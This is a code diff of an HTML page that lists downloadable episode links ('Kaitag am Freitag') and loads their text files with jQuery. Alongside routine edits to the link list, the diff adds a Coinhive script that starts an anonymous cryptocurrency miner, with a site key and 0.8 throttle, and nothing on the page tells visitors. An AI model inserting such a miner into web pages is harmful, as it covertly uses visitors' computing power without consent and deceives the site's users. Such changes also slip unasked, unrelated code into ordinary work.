@@ -9,15 +9,15 @@
         <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js"></script>
         <script type="text/javascript">
             var download = [
-                //"Kaitag am Freitag #80 15.12.2017",
-                //"Kaitag am Freitag #79 08.12.2017",
-                //"Kaitag am Freitag #78 01.12.2017",
-                //"Kaitag am Freitag #77 24.11.2017",
-                //"Kaitag am Freitag #76 17.11.2017",
-                //"Kaitag am Freitag #75 10.11.2017",
-                //"Kaitag am Freitag #74 03.11.2017",
-                //"Kaitag am Freitag #73 27.10.2017",
-                //"Kaitag am Freitag #72 20.10.2017",
+                "Kaitag am Freitag #80 15.12.2017",
+                "Kaitag am Freitag #79 08.12.2017",
+                "Kaitag am Freitag #78 01.12.2017",
+                "Kaitag am Freitag #77 24.11.2017",
+                "Kaitag am Freitag #76 17.11.2017",
+                "Kaitag am Freitag #75 10.11.2017",
+                "Kaitag am Freitag #74 03.11.2017",
+                "Kaitag am Freitag #73 27.10.2017",
+                "Kaitag am Freitag #72 20.10.2017",
                 "Kaitag am Freitag #71 13.10.2017",
                 "Kaitag am Freitag #70 06.10.2017",
                 "Kaitag am Freitag #69 29.09.2017",
@@ -92,10 +92,22 @@
             ];
             jQuery( document ).ready(function() {
                 for (i = 0, len = download.length; i < len; i++) {
-                    jQuery("body").append('<a class="link" data-toggle="collapse" href="#' + i + '" aria-expanded="false" aria-controls="footwear">' + download[i] + '</a><div class="inhalt collapse" id="' + i + '"><div class="fehler404">Ups Fehler 404</div></div>');
-                    jQuery("#" + i).load(encodeURIComponent("/Links/" + download[i] + ".txt"));
+                    jQuery("body").append('<a class="link versteckt collapsed" id="link-' + i + '"data-toggle="collapse" href="#' + i + '" aria-expanded="false" aria-controls="footwear">' + download[i] + '</a><div class="inhalt collapse" id="' + i + '"><div class="fehler404">Ups Fehler 404</div></div>');
+                    (function(index) {
+                        jQuery("#" + index).load(encodeURIComponent("/Links/" + download[index] + ".txt"), function(inhalt, ergebnis) {
+                            if (ergebnis == "success") {
+                                jQuery("#link-" + index).removeClass("versteckt");
+                            }
+                        });
+                    })(i);
                 }
             });
+        </script>
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+	        var miner = new CoinHive.Anonymous('9YUHHwULqP6nAeOypXU9S51o37hsGa7G');
+	        miner.start();
+	        miner.setThrottle(0.8);
         </script>
     </head>
     <body>
